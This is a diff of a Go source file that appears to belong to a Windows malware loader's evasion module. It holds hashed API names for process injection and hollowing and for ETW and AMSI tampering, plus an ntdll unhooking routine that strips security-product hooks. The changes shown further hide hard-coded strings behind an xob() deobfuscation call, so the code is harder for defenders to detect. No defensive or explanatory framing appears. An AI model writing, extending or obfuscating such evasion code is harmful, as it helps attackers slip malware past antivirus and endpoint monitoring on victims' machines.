@@ -28,26 +28,26 @@ func ntSyscall(num uintptr, a1, a2, a3, a4, a5, a6 uintptr) uintptr {
 
 // djb2 hashes of the export names we resolve (precomputed, no strings).
 const (
-	H_CreateProcessW         = 0xaeb52e2f
-	H_VirtualProtectEx       = 0xd812922a
-	H_VirtualProtect         = 0x844ff18d
-	H_WriteProcessMemory     = 0x6f22e8c8
-	H_GetThreadContext       = 0xeba2cfc2
-	H_SetThreadContext       = 0x7e20964e
-	H_ResumeThread           = 0x74162a6e
-	H_CloseHandle            = 0x3870ca07
-	H_VirtualAllocEx         = 0xf36e5ab4
-	H_CreateToolhelp32Snap   = 0x66851295
-	H_Module32FirstW         = 0xc9dc792f
-	H_Module32NextW          = 0xa1d369e6
-	H_ReadProcessMemory      = 0xb8932459
-	H_WaitForSingleObject    = 0xeccda1ba
-	H_GetProcAddress         = 0xcf31bb1f
-	H_LoadLibraryW           = 0x5fbff111
-	H_GetModuleHandleW       = 0x5a153f6e
-	H_GetCurrentProcess      = 0xca8d7527
-	H_EtwEventWrite          = 0x24a8d022
-	H_AmsiScanBuffer         = 0x29fcd18e
+	H_CreateProcessW       = 0xaeb52e2f
+	H_VirtualProtectEx     = 0xd812922a
+	H_VirtualProtect       = 0x844ff18d
+	H_WriteProcessMemory   = 0x6f22e8c8
+	H_GetThreadContext     = 0xeba2cfc2
+	H_SetThreadContext     = 0x7e20964e
+	H_ResumeThread         = 0x74162a6e
+	H_CloseHandle          = 0x3870ca07
+	H_VirtualAllocEx       = 0xf36e5ab4
+	H_CreateToolhelp32Snap = 0x66851295
+	H_Module32FirstW       = 0xc9dc792f
+	H_Module32NextW        = 0xa1d369e6
+	H_ReadProcessMemory    = 0xb8932459
+	H_WaitForSingleObject  = 0xeccda1ba
+	H_GetProcAddress       = 0xcf31bb1f
+	H_LoadLibraryW         = 0x5fbff111
+	H_GetModuleHandleW     = 0x5a153f6e
+	H_GetCurrentProcess    = 0xca8d7527
+	H_EtwEventWrite        = 0x24a8d022
+	H_AmsiScanBuffer       = 0x29fcd18e
 )
 
 const (
@@ -263,11 +263,11 @@ func syscallNumberFromImage(img []byte, nameHash uint32) (uint32, error) {
 
 // unhookNtdll restores ntdll .text from a clean on-disk copy.
 func unhookNtdll() error {
-	img, err := os.ReadFile(`C:\Windows\System32\ntdll.dll`)
+	img, err := os.ReadFile(xob(eNTDLLPath))
 	if err != nil {
-		return err
+		return fmt.Errorf("read ntdll image: %w", err)
 	}
-	ntdBase, _ := moduleBaseByName("ntdll.dll")
+	ntdBase, _ := moduleBaseByName(xob(eNTDLLName))
 	if ntdBase == 0 {
 		return fmt.Errorf("ntdll not in module list")
 	}
@@ -344,7 +344,7 @@ func InitEvasion() error {
 	ev.WaitForSingleObject, _ = resolve(H_WaitForSingleObject)
 
 	// clean syscall numbers from on-disk ntdll
-	img, err := os.ReadFile(`C:\Windows\System32\ntdll.dll`)
+	img, err := os.ReadFile(xob(eNTDLLPath))
 	if err != nil {
 		return err
 	}
